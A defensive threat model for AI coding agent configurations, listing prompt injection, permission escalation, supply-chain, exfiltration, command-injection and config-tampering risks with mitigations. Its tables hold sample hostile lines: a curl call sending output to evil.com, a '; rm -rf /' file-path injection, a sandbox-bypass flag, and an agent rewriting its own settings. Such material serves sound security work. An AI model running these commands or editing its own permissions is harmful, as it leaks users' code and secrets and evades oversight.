# AI Agent Configuration Threat Model

Threat model for Claude Code and AI agent configurations, organized by attack vector.

## 1. Threat Overview

AI coding agents operate with significant local system access. Misconfigured agents can be exploited through prompt injection, supply chain attacks, permission escalation, and data exfiltration.

### Attack Surface

```
┌─────────────────────────────────────────────┐
│                 User Input                   │
│  (prompts, file content, clipboard, URLs)    │
└──────────────────┬──────────────────────────┘
                   │
         ┌─────────▼─────────┐
         │   Claude Agent     │
         │                    │
         │  CLAUDE.md (rules) │
         │  settings.json     │
         │  MCP servers       │
         │  Hooks             │
         │  Agent definitions │
         └────────┬───────────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐  ┌─────▼─────┐  ┌───▼───┐
│ Files │  │   Shell    │  │  MCP  │
│ (R/W) │  │  (Bash)    │  │Servers│
└───────┘  └───────────┘  └───────┘
```

## 2. Threat Categories

### T1: Prompt Injection

**Vector:** Malicious instructions embedded in files, URLs, or user input that override the agent's intended behavior.

| Scenario | Example | Impact |
|----------|---------|--------|
| CLAUDE.md injection | Hidden instructions in markdown comments | Agent executes attacker commands |
| File content injection | Malicious code in a file the agent reads | Agent processes/executes payload |
| URL content injection | Fetched web page contains override instructions | Agent follows attacker instructions |
| Commit message injection | PR description with embedded instructions | Agent runs commands during review |

**Mitigations:**
- Review CLAUDE.md for hidden instructions (HTML comments, zero-width chars)
- Don't auto-execute instructions from untrusted sources
- Use PreToolUse hooks to validate commands before execution
- Scope agent permissions to minimum required

### T2: Permission Escalation

**Vector:** Overly permissive configurations that grant more access than needed.

| Scenario | Example | Impact |
|----------|---------|--------|
| Wildcard Bash | `Bash(*)` in allow list | Any shell command can run |
| Missing deny list | No blocked commands | Destructive operations possible |
| Agent tool creep | Agent with Read + Write + Bash | Full system access |
| Sandbox bypass | `dangerouslyDisableSandbox: true` | Escapes file system sandbox |

**Mitigations:**
- Always use scoped Bash permissions: `Bash(npm test)`, not `Bash(*)`
- Maintain a deny list for destructive, network, and system commands
- Review agent tool lists — principle of least privilege
- Never enable sandbox bypass in production

### T3: Supply Chain Attacks

**Vector:** Malicious or compromised packages installed via MCP server configurations.

| Scenario | Example | Impact |
|----------|---------|--------|
| Typosquatting | `@modelcontextprotcol/server-fs` (misspelled) | Malicious package installed |
| Auto-install | `npx -y malicious-mcp-server` | Code execution on install |
| Dependency confusion | Internal package name matches public npm | Wrong package installed |
| Compromised server | Legit MCP server with backdoor update | Persistent access |

**Mitigations:**
- Verify exact package names before adding MCP servers
- Pin package versions: `npx @mcp/server-fs@1.2.3` not `npx -y @mcp/server-fs`
- Review MCP server source code for new additions
- Use `npm audit` on MCP server dependencies
- Prefer well-known, audited MCP servers

### T4: Data Exfiltration

**Vector:** Hooks, MCP servers, or agent instructions that send data to external servers.

| Scenario | Example | Impact |
|----------|---------|--------|
| Hook exfiltration | `curl https://evil.com -d "${output}"` | Source code / secrets leaked |
| MCP server leakage | Server sends file contents to external API | IP theft |
| Agent instruction | "Send results to webhook" in CLAUDE.md | Data breach |
| Log forwarding | Hooks that forward tool output externally | Activity monitoring |

**Mitigations:**
- Block network commands in deny list: `curl`, `wget`, `nc`
- Audit all hooks for outbound network calls
- Review MCP server network behavior
- Monitor DNS queries from agent processes
- Use network-restricted environments for sensitive work

### T5: Command Injection

**Vector:** User-controlled input interpolated into shell commands in hooks.

| Scenario | Example | Impact |
|----------|---------|--------|
| File path injection | `process "${file_path}"` where path is `; rm -rf /` | Arbitrary command execution |
| Content injection | `echo "${content}" \| lint` where content has backticks | Code execution |
| Env var injection | `export VAR="${user_input}"` | Environment manipulation |

**Mitigations:**
- Never interpolate variables directly into shell commands
- Use positional parameters (`$1`, `$2`) instead of named variables
- Quote all variable expansions
- Validate input before passing to shell
- Use `--` to terminate option parsing

### T6: Configuration Tampering

**Vector:** Agent modifies its own configuration files to escalate privileges.

| Scenario | Example | Impact |
|----------|---------|--------|
| Settings modification | Agent writes to `.claude/settings.json` | Permission escalation |
| CLAUDE.md modification | Agent adds "allow all" to CLAUDE.md | Rule bypass |
| Hook modification | Agent creates exfiltration hook | Persistent backdoor |
| MCP addition | Agent adds malicious MCP server | Supply chain compromise |

**Mitigations:**
- Deny Write access to `.claude/` directory
- Use file system permissions to protect config files
- Monitor config file changes with git hooks
- CI/CD scan on any `.claude/` file changes

## 3. Risk Matrix

| Threat | Likelihood | Impact | Risk Level | Priority |
|--------|-----------|--------|------------|----------|
| T1: Prompt Injection | High | High | **Critical** | P0 |
| T2: Permission Escalation | High | Critical | **Critical** | P0 |
| T3: Supply Chain | Medium | High | **High** | P1 |
| T4: Data Exfiltration | Medium | Critical | **High** | P1 |
| T5: Command Injection | Medium | Critical | **High** | P1 |
| T6: Config Tampering | Low | High | **Medium** | P2 |

## 4. Defense in Depth

```
Layer 1: Permissions     → Scoped allow list + deny list
Layer 2: Hooks           → PreToolUse validation + audit logging
Layer 3: MCP Security    → Verified servers + no hardcoded secrets
Layer 4: CLAUDE.md       → No injection vectors + security guidelines
Layer 5: CI/CD           → Automated scan on config changes
Layer 6: Monitoring      → Audit logs + periodic manual review
```

## 5. Incident Response

If a configuration vulnerability is discovered:

1. **Contain** — Revoke any leaked credentials immediately
2. **Assess** — Determine if the vulnerability was exploited (check audit logs)
3. **Fix** — Apply configuration hardening
4. **Verify** — Re-run security scan to confirm fix
5. **Rotate** — Rotate all credentials that may have been exposed
6. **Document** — Record the finding and remediation steps
7. **Prevent** — Add CI/CD check to catch similar issues
